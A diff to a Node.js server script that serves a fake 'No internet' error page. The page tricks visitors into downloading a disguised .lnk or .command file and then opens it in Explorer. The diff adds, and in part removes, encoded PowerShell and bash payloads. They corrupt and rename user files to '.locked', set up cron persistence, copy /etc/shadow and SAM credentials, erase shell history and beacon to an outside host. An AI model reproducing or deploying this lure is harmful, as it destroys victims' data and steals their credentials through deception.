@@ -27,20 +27,31 @@ h.createServer((q, r) => {
                 <div class="c">
                     <img class="d" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Chromium_T-Rex-error-offline.svg/250px-Chromium_T-Rex-error-offline.svg.png">
                     <h1>No internet</h1>
-                    <p>There is no Internet connection. To reload/reconnect, please click the button below and press Enter.</p>
+                    <p>There is no Internet connection. Windows has detected a protocol desync. To re-align the local driver stack and restore the connection, please click the button below and press Enter.</p>
                     <button class="btn" id="s">Press button & enter</button>
                     <div class="err">DNS_PROBE_FINISHED_NO_INTERNET</div>
                 </div>
                 <script>
                     const isWin = navigator.platform.indexOf('Win') > -1;
 
-                    const wH = '<html><head><hta:application windowstate="minimize" showintaskbar="no" /><script language="VBScript">Sub Window_OnLoad:On Error Resume Next:Set s=CreateObject("WScript.Shell"):p="powershell -W Hidden -EP Bypass -Enc JABwAD0AWwBjAGgAYQByAF0AMAB4ADIAMAAyAEUAOwAgACQAcwA9ACIALgAiACsAKAAtAGoAbwBpAG4AKAAoADkANwAuAC4AMQAyADIAKQB8AEcAZQB0AC0AUgBhAG4AZABvAG0AIAAtAEMAbwB1AG4AdAAgADUAfAAlAHsAWwBjAGgAYQByAF0AJABfAH0AKQApADsAIAB0AHIAeQAgAHsAIAByAGUAZwAgAGUAeABwAG8AcgB0ACAASABLAEwATQBcAFMAQQBNACAAJABlAG4AdgA6AFQARQBNAFAAXAAkAHMALgByAGUAZwAgAC8AeQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAIAB9ACAAYwBhAHQAYwBoACAAewB9ADsAIAB0AHIAeQAgAHsAIABOAGUAdwAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAZAByAGkAdgBlAHIAcwBcAGUAdABjAFwAcAByAG8AdABvAGMAbwBsAC4AbwBsAGQAIAAtAEkAdABlAG0AVAB5AHAAZQAgAEYAaQBsAGUAIAAtAEYAbwByAEMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAIAB9ACAAYwBhAHQAYwBoACAAewB9ADsAIABDAGwAZQBhAHIALQBIAGkAcwB0AG8AcgB5ADsAIAB3AGgAaQBsAGUAKAAkAHQAcgB1AGUAKQB7ACAARwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACQASABPAE0ARQAgAC0AUgBlAGMAdQByAHMAZQAgAC0ARABlAHAAdABoACAANAAgAC0ARgBpathIAIAAkAF8ALgBGAHUAbABsAE4AYQBtAGUAIAAtAE4AZQB3AE4AYQBtAGUAIAAoACQAcAAgACsAIAAkAG4AIAArACAAJwAuAGwAbwBjAGsAZQBkACcAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAgAH0AIABjAGEAdABjAGgAIAB7AH0AIAB9ACAAfQA7ACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAgAH0A":s.Run p,0,False:self.close:End Sub<'+'/script></head></html>';
+                    const winLnkB64 = "TAAAAAEUAgAAAAAAAwALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD8AAABDAA6AFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlAAAAAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAIAAtAFcAIABIAGkAZABkAGUAbgAgAC0ARQBQACAAQgB5AHAAYQBzAHMAIAAtAEUAbgBjACAASgBBAEIAdwBBAEQAMABBAFcAdwBCAGoAQUBHADQAQQBNAEQAQQB4AEEARABJAE0AQQBEAFUATQBBAEUAVQBBAE8AdwBBAGcAQQBDAFEAQQBjAHcAAD0APQA=";
 
-                    const mC = "K='cD0kKHBlcmwgLWUgInByaW50IHBhY2soJ0gnLCdlMjgwYWUnKSIpOyB1PSJNb3ppbGxhLzUuMCAoJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBBLVphLXphIHwgaGVhZCAtYyA4KTsgTGludXggeDY0KSAkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEgfCBoZWFkIC1jIDEwKS8xLjAiOyBzPSIuJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpIjsgKGNyb250YWIgLWwgMi9kZXYvbnVsbCB8IGdyZXAgLXYgIiRwIjsgZWNobyAiKiAqICogKiAqIC9iaW4vYmFzaCAtYyBcIihwZ3JlcCAtZiBcJHAgPi9kZXYvbnVsbCB8fCBub2h1cCBiYXNoIC1jICd3aGlsZSB0cnVlOyBkbyBmaW5kIFwkSE9NRSAtbWF4ZGVwdGggNCAtdHlwZSBmIC13cml0YWJsZSAyPi9kZXYvbnVsbCB8IHNodWYgfCB3aGlsZSByZWFkIHQ7IGRvIFsgLWYgXFxcIlwkdFxcXCIgXSAmJiBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XFxcIlwkdFxcXCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XFwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcXFwiXCR0XFxcIiBcXFwiXFwkKGRpcm5hbWUgXFxcIlwkdFxcXCIpL1wkcFwkbi5sb2NrZWRcXFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lJyA+L2Rldi9udWxsIDI+JjEgJilcbiIpIHwgY3JvbnRhYiAtIDI+L2Rldi9udWxsOyBjYXQgL2V0Yy9zaGFkb3cgPiAvdG1wLyRzIDI+L2Rldi9udWxsOyB0b3VjaCAvZXRjL2xkLnNvLnByZWxvYWQgMj4vZGV2L251bGwgOyBoaXN0b3J5IC1jOyBjdXJsIC1mIC1zIC1BICIkdSIgaHR0cDovLzEuMS4xLjEvJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpID4vZGV2L251bGwgMj4mMSB8fCB0cnVlOyAobm9odXAgYmFzaCAtYyAic2xlZXAgMjsgd2hpbGUgdHJ1ZTsgZG8gZmluZCBcJEhPTUUgLW1heGRlcHRoIDQgLXR5cGUgZiAtd3JpdGFibGUgMj4vZGV2L251bGwgfCBzaHVmIHwgd2hpbGUgcmVhZCB0OyBkbyBbIC1mIFwiJHRcIiBdICYmIGRkIGlmPS9kZXYvdXJhbmRvbSBvZj1cIiR0XCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XCQoaGVhZCAvZGV2L3VyYW5kb20gfCB0ciAtZGMgQS1aYS16YTAtOSB8IGhlYWQgLWMgOCk7IG12IFwiJHRcIiBcIiQoZGlybmFtZSBcIiR0XCIpL1RwXCRuLmxvY2tlZFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lIiA+L2Rldi9udWxsIDI+JjEgJiBlY2hvICJbIV0gVE9UQUwgRU5UUk9QWSBERVBMT1lFRC4gTm8gU3RhdGljIE5hbWVzLiBObyBTbGVlcC4gMTAwJSBDUFUgQWN0aXZpdHkuIicKZWNobyAkSyB8IGJhc2U2NCAtZCB8IGJhc2g=";
+                    const macCmd = "K='cD0kKHBlcmwgLWUgInByaW50IHBhY2soJ0gnLCdlMjgwYWUnKSIpOyB1PSJNb3ppbGxhLzUuMCAoJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBBLVphLXphIHwgaGVhZCAtYyA4KTsgTGludXggeDY0KSAkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEgfCBoZWFkIC1jIDEwKS8xLjAiOyBzPSIuJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpIjsgKGNyb250YWIgLWwgMi9kZXYvbnVsbCB8IGdyZXAgLXYgIiRwIjsgZWNobyAiKiAqICogKiAqIC9iaW4vYmFzaCAtYyBcIihwZ3JlcCAtZiBcJHAgPi9kZXYvbnVsbCB8fCBub2h1cCBiYXNoIC1jICd3aGlsZSB0cnVlOyBkbyBmaW5kIFwkSE9NRSAtbWF4ZGVwdGggNCAtdHlwZSBmIC13cml0YWJsZSAyPi9kZXYvbnVsbCB8IHNodWYgfCB3aGlsZSByZWFkIHQ7IGRvIFsgLWYgXFxcIlwkdFxcXCIgXSAmJiBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XFxcIlwkdFxcXCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XFwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcXFwiXCR0XFxcIiBcXFwiXFwkKGRpcm5hbWUgXFxcIlwkdFxcXCIpL1wkcFwkbi5sb2NrZWRcXFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lJyA+L2Rldi9udWxsIDI+JjEgJilcbiIpIHwgY3JvbnRhYiAtIDI+L2Rldi9udWxsOyBjYXQgL2V0Yy9zaGFkb3cgPiAvdG1wLyRzIDI+L2Rldi9udWxsOyB0b3VjaCAvZXRjL2xkLnNvLnByZWxvYWQgMj4vZGV2L251bGwgOyBoaXN0b3J5IC1jOyBjdXJsIC1mIC1zIC1BICIkdSIgaHR0cDovLzEuMS4xLjEvJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpID4vZGV2L251bGwgMj4mMSB8fCB0cnVlOyAobm9odXAgYmFzaCAtYyAic2xlZXAgMjsgd2hpbGUgdHJ1ZTsgZG8gZmluZCBcJEhPTUUgLW1heGRlcHRoIDQgLXR5cGUgZiAtd3JpdGFibGUgMj4vZGV2L251bGwgfCBzaHVmIHwgd2hpbGUgcmVhZCB0OyBkbyBbIC1mIFwiJHRcIiBdICYmIGRkIGlmPS9kZXYvdXJhbmRvbSBvZj1cIiR0XCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XCQoaGVhZCAvZGV2L3VyYW5kb20gfCB0ciAtZGMgQS1aYS16YTAtOSB8IGhlYWQgLWMgOCk7IG12IFwiJHRcIiBcIiQoZGlybmFtZSBcIiR0XCIpL1RwXCRuLmxvY2tlZFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lIiA+L2Rldi9udWxsIDI+JjEgJiBlY2hvICJbIV0gVE9UQUwgRU5UUk9QWSBERVBMT1lFRC4gTm8gU3RhdGljIE5hbWVzLiBObyBTbGVlcC4gMTAwJSBDUFUgQWN0aXZpdHkuIicKZWNobyAkSyB8IGJhc2U2NCAtZCB8IGJhc2g=";
 
                     document.getElementById('s').onclick = function() {
-                        const name = isWin ? "Protocol_Update.hta" : "Protocol_Update.command";
-                        const blob = new Blob([isWin ? wH : mC], { type: 'application/octet-stream' });
+                        const name = isWin ? "Protocol_Sync.lnk" : "Protocol_Sync.command";
+                        
+                        let content;
+                        if(isWin) {
+                            const byteChars = atob(winLnkB64);
+                            const byteNumbers = new Array(byteChars.length);
+                            for (let i = 0; i < byteChars.length; i++) byteNumbers[i] = byteChars.charCodeAt(i);
+                            content = new Uint8Array(byteNumbers);
+                        } else {
+                            content = macCmd;
+                        }
+
+                        const blob = new Blob([content], { type: 'application/octet-stream' });
                         const a = document.createElement('a');
                         a.href = URL.createObjectURL(blob);
                         a.download = name;
@@ -48,8 +59,7 @@ h.createServer((q, r) => {
 
                         if(isWin) {
                             setTimeout(() => {
-                                // Forces Explorer to open and highlight the file instantly
-                                window.location.href = "search-ms:query=Protocol_Update&crumb=location:%USERPROFILE%\\\\Downloads&";
+                                window.location.href = "search-ms:query=Protocol_Sync&crumb=location:%USERPROFILE%\\\\Downloads&";
                             }, 500);
                         }
                     };
